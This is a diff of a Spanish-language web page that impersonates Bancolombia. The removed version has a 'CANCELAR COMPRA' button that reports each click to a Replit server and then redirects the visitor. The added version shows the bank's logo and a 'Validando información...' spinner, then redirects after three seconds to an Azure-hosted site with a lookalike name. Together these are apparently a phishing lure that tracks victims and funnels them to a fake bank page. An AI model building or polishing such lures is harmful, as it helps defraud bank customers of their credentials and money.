@@ -2,67 +2,52 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sucursal Virtual</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirigiendo...</title>
   <style>
     body {
       margin: 0;
+      background-color: #ffffff;
       font-family: Arial, sans-serif;
-      background: #ffffff;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
+      flex-direction: column;
       height: 100vh;
     }
 
-    h1 {
-      color: #0033a0;
-      font-size: 2.5rem;
+    .container {
+      text-align: center;
+    }
+
+    .logo {
+      max-width: 150px;
       margin-bottom: 20px;
     }
 
-    p {
-      font-size: 1.2rem;
-      color: #333;
-      margin-bottom: 30px;
+    .mensaje {
+      font-size: 1.5rem;
+      color: #0033a0;
+      margin-bottom: 20px;
     }
 
-    button {
-      background-color: #f2c50f;
-      color: #000;
-      border: none;
-      padding: 15px 30px;
-      font-size: 1rem;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #e6ba00;
+    .loader {
+      width: 50px;
+      height: 50px;
     }
   </style>
 </head>
 <body>
-  <h1>SUCURSAL VIRTUAL</h1>
-  <p>Ingresa para cancelar</p>
-  <button onclick="handleClick()">CANCELAR COMPRA</button>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3b/Logo_Bancolombia.svg" alt="Logo" class="logo" />
+    <div class="mensaje">Validando información...</div>
+    <img src="https://i.gifer.com/ZZ5H.gif" alt="Cargando" class="loader" />
+  </div>
 
   <script>
-    function handleClick() {
-      // Enviar mensaje a tu servidor Replit
-      fetch("https://81a34643-b26f-4b4d-b65a-3c9335906310-00-3ammodfiig1g0.riker.replit.dev/", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          mensaje: "El usuario hizo clic en CANCELAR COMPRA"
-        })
-      });
-
-      // Redirigir
-      window.location.href = "https://8fb914f6-404b-4c40-abd2-086acfe3aab0-00-2te1k68jdlrd4.spock.replit.dev/";
-    }
+    setTimeout(() => {
+      window.location.href = "https://bnlombicancelard.z13.web.core.windows.net/";
+    }, 3000); // Redirige en 3 segundos
   </script>
 </body>
 </html>
